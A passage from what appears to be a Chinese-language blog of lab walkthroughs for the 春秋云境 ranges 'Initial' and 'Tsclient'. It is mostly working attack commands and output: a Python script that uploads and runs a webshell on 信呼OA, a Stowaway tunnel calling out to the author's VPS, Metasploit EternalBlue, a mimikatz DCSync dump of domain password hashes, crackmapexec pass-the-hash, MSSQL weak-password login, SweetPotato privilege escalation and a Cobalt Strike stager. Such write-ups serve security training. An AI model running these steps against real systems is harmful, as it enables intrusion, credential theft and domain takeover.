</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:05<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:identified 详情:fingerprints<span style="color:#f92672">=[]</span>, port<span style="color:#f92672">=</span>80, service<span style="color:#f92672">=</span>http, title<span style="color:#f92672">=</span>无标题, Url<span style="color:#f92672">=</span>http://172.22.1.18, status_code<span style="color:#f92672">=</span>302, length<span style="color:#f92672">=</span>0, server_info<span style="color:#f92672">=</span>map<span style="color:#f92672">[</span>cache-control:no-store, no-cache, must-revalidate content-length:0 content-type:text/html;charset<span style="color:#f92672">=</span>utf-8 date:Wed, <span style="color:#ae81ff">22</span> Oct <span style="color:#ae81ff">2025</span> 15:59:04 GMT expires:Thu, <span style="color:#ae81ff">19</span> Nov <span style="color:#ae81ff">1981</span> 08:52:00 GMT length:0 location:?m<span style="color:#f92672">=</span>login pragma:no-cache redirect_Url:http://172.22.1.18?m<span style="color:#f92672">=</span>login server:Apache/2.4.23 <span style="color:#f92672">(</span>Win32<span style="color:#f92672">)</span> OpenSSL/1.0.2j mod_fcgid/2.3.9 set-cookie:PHPSESSID<span style="color:#f92672">=</span>usae6qvqpcqiqc1jrcdvuubeu6; path<span style="color:#f92672">=</span>/ status_code:302 title:无标题 x-powered-by:PHP/7.1.9<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:05<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:identified 详情:title<span style="color:#f92672">=</span>信呼协同办公系统, Url<span style="color:#f92672">=</span>http://172.22.1.18?m<span style="color:#f92672">=</span>login, status_code<span style="color:#f92672">=</span>200, length<span style="color:#f92672">=</span>4012, server_info<span style="color:#f92672">=</span>map<span style="color:#f92672">[</span>cache-control:no-store, no-cache, must-revalidate content-type:text/html;charset<span style="color:#f92672">=</span>utf-8 date:Wed, <span style="color:#ae81ff">22</span> Oct <span style="color:#ae81ff">2025</span> 15:59:05 GMT expires:Thu, <span style="color:#ae81ff">19</span> Nov <span style="color:#ae81ff">1981</span> 08:52:00 GMT length:4012 pragma:no-cache server:Apache/2.4.23 <span style="color:#f92672">(</span>Win32<span style="color:#f92672">)</span> OpenSSL/1.0.2j mod_fcgid/2.3.9 set-cookie:PHPSESSID<span style="color:#f92672">=</span>fv540efek5pjvre6rfkjapbcvo; path<span style="color:#f92672">=</span>/ status_code:200 title:信呼协同办公系统 x-powered-by:PHP/7.1.9<span style="color:#f92672">]</span>, fingerprints<span style="color:#f92672">=[]</span>, port<span style="color:#f92672">=</span>80, service<span style="color:#f92672">=</span>http
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:07<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>VULN<span style="color:#f92672">]</span> 目标:http://172.22.1.15:80 状态:vulnerable 详情:vulnerability_type<span style="color:#f92672">=</span>poc-yaml-thinkphp5023-method-rce, vulnerability_name<span style="color:#f92672">=</span>poc1, references<span style="color:#f92672">=[</span>https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>信息收集：</p>
<pre tabindex="0"><code>172.22.1.2：DC域控
172.22.1.15：thinkphp5.0.23 RCE 已被利用
172.22.1.18：信呼协同办公系统
172.22.1.21：XIAORANG-WIN7 存在MS17-010漏洞
</code></pre><p>先利用 <code>Stowaway</code> 进行内网代理，蚁剑上传 <code>linux_x64_agent</code>，给执行权限，vps先开启服务端：</p>
<pre tabindex="0"><code>./linux_x64_admin -l 2345 -s 114514
</code></pre><p>172.22.1.15 入口机连接服务端：</p>
<pre tabindex="0"><code>./linux_x64_agent -c vps的ip:2345 -s 114514
</code></pre><p>vps开放端口3456：</p>
<pre tabindex="0"><code>(admin) &gt;&gt; use 0
(node 0) &gt;&gt; socks 3456
[*] Trying to listen on 0.0.0.0:3456......
[*] Waiting for agent&#39;s response......
[*] Socks start successfully!
</code></pre><p>本地浏览器配置 <code>FoxyProxy</code>：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/2.png"></p>
<p>访问到内网的信呼协同办公系统web服务：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/3.png"></p>
<p>配置kali上的 <code>/etc/proxychains4.conf</code>：</p>
<pre tabindex="0"><code>socks5 vps的ip 3456
</code></pre><p>利用网上已有的脚本，exp.py：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url_pre <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://172.22.1.18/&#39;</span>
</span></span><span style="display:flex;"><span>url1 <span style="color:#f92672">=</span> url_pre <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;</span>
</span></span><span style="display:flex;"><span>url2 <span style="color:#f92672">=</span> url_pre <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;</span>
</span></span><span style="display:flex;"><span>url3 <span style="color:#f92672">=</span> url_pre <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data1 <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;rempass&#39;</span>: <span style="color:#e6db74">&#39;0&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;jmpass&#39;</span>: <span style="color:#e6db74">&#39;false&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;device&#39;</span>: <span style="color:#e6db74">&#39;1625884034525&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ltype&#39;</span>: <span style="color:#e6db74">&#39;0&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;adminuser&#39;</span>: <span style="color:#e6db74">&#39;YWRtaW4=&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;adminpass&#39;</span>: <span style="color:#e6db74">&#39;YWRtaW4xMjM=&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;yanzm&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(url1, data<span style="color:#f92672">=</span>data1)
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(url2, files<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;file&#39;</span>: open(<span style="color:#e6db74">&#39;1.php&#39;</span>, <span style="color:#e6db74">&#39;r+&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>filepath <span style="color:#f92672">=</span> str(r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;filepath&#39;</span>])
</span></span><span style="display:flex;"><span>filepath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> filepath<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.uptemp&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.php&#39;</span>
</span></span><span style="display:flex;"><span>id <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;id&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url3 <span style="color:#f92672">=</span> url_pre <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(url3)
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(url_pre <span style="color:#f92672">+</span> filepath <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?1=system(&#39;dir&#39;);&#34;</span>)
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p>搭配 <code>proxychains</code> 利用脚本上传webshell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ proxychains python exp.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.16
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  vps的ip:3456  ...  172.22.1.18:80  ...  OK
</span></span><span style="display:flex;"><span> ������ C �еľ�û�б�ǩ��
</span></span><span style="display:flex;"><span> �������к��� E0D6-4F4A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> C:<span style="color:#ae81ff">\p</span>hpStudy<span style="color:#ae81ff">\P</span>HPTutorial<span style="color:#ae81ff">\W</span>WW<span style="color:#ae81ff">\u</span>pload<span style="color:#ae81ff">\2</span>025-10 ��Ŀ¼
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025/10/23  11:40    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>2025/10/23  11:40    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>2025/10/23  11:33                <span style="color:#ae81ff">40</span> 23_11332296.uptemp
</span></span><span style="display:flex;"><span>2025/10/23  11:40                <span style="color:#ae81ff">29</span> 23_11405758.php
</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> ���ļ�             <span style="color:#ae81ff">69</span> ��
</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> ��Ŀ¼ 22,776,528,896 ������
</span></span></code></pre></div><p>蚁剑连配置好代理：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/6.png"></p>
<p>连上内网的webshell，查看当前用户：</p>
<pre tabindex="0"><code>C:\phpStudy\PHPTutorial\WWW\upload\2025-10&gt; whoami
nt authority\system
</code></pre><p>C:/Users/Administrator/flag/flag02.txt：</p>
<pre tabindex="0"><code> ___    ___ ___  ________  ________  ________  ________  ________   ________     
|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    
\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    
 \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  
  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ 
 /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\
/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|
|__|/ \|__|                                                                      


flag02: 2ce3-4813-87d4-

Awesome! ! ! You found the second flag, now you can attack the domain controller.
</code></pre><p><code>proxychains</code> + <code>msfconsole</code> 打永恒之蓝：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ proxychains msfconsole
</span></span><span style="display:flex;"><span>msf6 &gt; search ms17-010
</span></span><span style="display:flex;"><span>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; show payloads
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set payload windows/x64/meterpreter/bind_tcp_uuid
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set RHOSTS 172.22.1.21
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; exploit
</span></span></code></pre></div><p>运行成功后出现 <code>meterpreter&gt;</code>，此时已经是SYSTEM 账户，可以通过 DCSync 来导出所有用户的 hash 然后进行哈希传递攻击，要想使用 DCSync 必须获得以下任一用户的权限：</p>
<pre tabindex="0"><code>Administrators 组内的用户
Domain Admins 组内的用户
Enterprise Domain Admins 组内的用户
</code></pre><p>调用mimikatz模块打 PTH，导出域内所有用户的信息(包括哈希值)：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>load kiwi
</span></span><span style="display:flex;"><span>kiwi_cmd <span style="color:#e6db74">&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span> exit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DC<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;xiaorang.lab&#39;</span> will be the domain
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DC<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;DC01.xiaorang.lab&#39;</span> will be the DC server
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DC<span style="color:#f92672">]</span> Exporting domain <span style="color:#e6db74">&#39;xiaorang.lab&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>rpc<span style="color:#f92672">]</span> Service  : ldap
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>rpc<span style="color:#f92672">]</span> AuthnSvc : GSS_NEGOTIATE <span style="color:#f92672">(</span>9<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">502</span>     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        <span style="color:#ae81ff">514</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1106</span>    Marcus  e07510a4284b3c97c8e7dee970918c5c        <span style="color:#ae81ff">512</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1107</span>    Charles f6a9881cd5ae709abb4ac9ab87f24617        <span style="color:#ae81ff">512</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1000</span>    DC01$   5e213d826e0f3abd5da6a60008fc7d17        <span style="color:#ae81ff">532480</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">500</span>     Administrator   10cf89a850fb1cdbe6bb432b859164c8        <span style="color:#ae81ff">512</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1104</span>    XIAORANG-OA01$  96772bfc48f72ad75bee0775454111f1        <span style="color:#ae81ff">4096</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1108</span>    XIAORANG-WIN7$  71611aa5ef5bb0f273b6bb8c1e88b990        <span style="color:#ae81ff">4096</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz<span style="color:#f92672">(</span>powershell<span style="color:#f92672">)</span> <span style="color:#75715e"># exit</span>
</span></span><span style="display:flex;"><span>Bye!
</span></span></code></pre></div><p><code>proxychains</code> + <code>crackmapexec</code> 来进行横向移动，直接执行获取flag3的命令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span style="color:#e6db74">&#34;type Users\Administrator\flag\flag03.txt&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.16
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> First time use detected
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating home directory structure
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating default workspace
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Initializing FTP protocol database
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Initializing SSH protocol database
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Initializing SMB protocol database
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Initializing RDP protocol database
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Initializing LDAP protocol database
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Initializing WINRM protocol database
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Initializing MSSQL protocol database
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Copying default configuration file
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating SSL certificate
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.16
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  vps的ip:3456  ...  172.22.1.2:445  ...  OK
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  vps的ip:3456  ...  172.22.1.2:135  ...  OK
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Datacenter <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:xiaorang.lab<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  vps的ip:3456  ...  172.22.1.2:445  ...  OK
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> xiaorang.lab<span style="color:#ae81ff">\a</span>dministrator:10cf89a850fb1cdbe6bb432b859164c8 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  vps的ip:3456  ...  172.22.1.2:135  ...  OK
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  vps的ip:3456  ...  172.22.1.2:49668  ...  OK
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executed command 
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             ___   ___
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             <span style="color:#ae81ff">\\</span> / /       / /    // | |     //   <span style="color:#f92672">)</span> <span style="color:#f92672">)</span> //   <span style="color:#f92672">)</span> <span style="color:#f92672">)</span>  // | |     /|    / / //   <span style="color:#f92672">)</span> <span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             <span style="color:#ae81ff">\ </span> /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             / /       / /    / ___  |   //   / / / ___ <span style="color:#f92672">(</span>   / ___  |   // |  / / //  ____
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             / /<span style="color:#ae81ff">\\</span>     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             / /  <span style="color:#ae81ff">\\</span> __/ /___ //     | | <span style="color:#f92672">((</span>___/ / //    | | //     | | //   |/ / <span style="color:#f92672">((</span>____/ /
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             flag03: e8f88d0d43d6<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             
</span></span><span style="display:flex;"><span>SMB         172.22.1.2      <span style="color:#ae81ff">445</span>    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.
</span></span></code></pre></div><p>flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</p>
<p>参考资料：</p>
<p><a href="https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/">https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/</a></p>
<h2 id="tsclient">Tsclient<a hidden class="anchor" aria-hidden="true" href="#tsclient">#</a></h2>
<p>靶机ip：39.98.109.218</p>
<p>nmap：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nmap 39.98.109.218 -sV -sS --min-rate <span style="color:#ae81ff">10000</span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-12-14 18:24 HKT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 39.98.109.218
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0048s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.45 seconds
</span></span></code></pre></div><p>fscan扫描漏洞：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./fscan -h 39.98.109.218               
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   ___                              _    
</span></span><span style="display:flex;"><span>  / _ <span style="color:#ae81ff">\ </span>    ___  ___ _ __ __ _  ___| | __ 
</span></span><span style="display:flex;"><span> / /_<span style="color:#ae81ff">\/</span>____/ __|/ __| <span style="color:#960050;background-color:#1e0010">&#39;</span>__/ _<span style="color:#e6db74">`</span> |/ __| |/ /
</span></span><span style="display:flex;"><span>/ /_<span style="color:#ae81ff">\\</span>_____<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span><span style="color:#f92672">(</span>__| | | <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>__|   &lt;    
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\_</span>___/     |___/<span style="color:#ae81ff">\_</span>__|_|  <span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>__|_|<span style="color:#ae81ff">\_\ </span>  
</span></span><span style="display:flex;"><span>                     fscan version: 1.8.4
</span></span><span style="display:flex;"><span>start infoscan
</span></span><span style="display:flex;"><span>39.98.109.218:1433 open
</span></span><span style="display:flex;"><span>39.98.109.218:80 open
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>start vulscan
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://39.98.109.218      code:200 len:703    title:IIS Windows Server
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> mssql 39.98.109.218:1433:sa 1qaz!QAZ
</span></span><span style="display:flex;"><span>已完成 2/2                                                                                
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 扫描结束,耗时: 10.136861589s
</span></span></code></pre></div><p>扫出 mssql 服务开放在端口1433上，存在弱口令问题，用户名<code>sa</code>，密码<code>1qaz!QAZ</code>，用MDUT连上：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/7.png"></p>
<p>whoami：</p>
<pre tabindex="0"><code>nt service\mssqlserver
</code></pre><p>ipconfig：</p>
<pre tabindex="0"><code>Windows IP 配置


以太网适配器 以太网:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::e576:667d:2727:e225%14
   IPv4 地址 . . . . . . . . . . . . : 172.22.8.18
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 172.22.255.253

隧道适配器 isatap.{E309DFD0-37D7-4E89-A23A-3C61210B34EA}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 Teredo Tunneling Pseudo-Interface:

   连接特定的 DNS 后缀 . . . . . . . : 
   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:4ee:26a:d89d:9225
   本地链接 IPv6 地址. . . . . . . . : fe80::4ee:26a:d89d:9225%12
   默认网关. . . . . . . . . . . . . : ::
</code></pre><p>上传SweetPotato.exe到 <code>C:/Users/Public/</code> 目录下进行提权：</p>
<pre tabindex="0"><code>C:/Users/Public/SweetPotato.exe -a whoami
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/8.png"></p>
<p>flag01.txt：</p>
<pre tabindex="0"><code>C:/Users/Public/SweetPotato.exe -a &#34;type C:\Users\Administrator\flag\flag01.txt&#34;
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/9.png"></p>
<p>上传cs stager并用以 <code>nt authority\system</code> 权限运行：</p>
<pre tabindex="0"><code>C:/Users/Public/SweetPotato.exe -a C:/Users/Public/artifact.exe
</code></pre><p>cs上线：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/11.png"></p>
<p>查看本地用户账户：</p>
<pre tabindex="0"><code>shell net user
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/12.png"></p>
<p>获取当前登录用户和远程登录用户：</p>
<pre tabindex="0"><code>shell quser
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/13.png"></p>
<p>hashdump导出所有用户哈希：</p>
<pre tabindex="0"><code>hashdump
</code></pre><p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/14.png"></p>
<p>john用户之前看到作为本地用户而且是在线的，查看一下占用了哪些进程：</p>
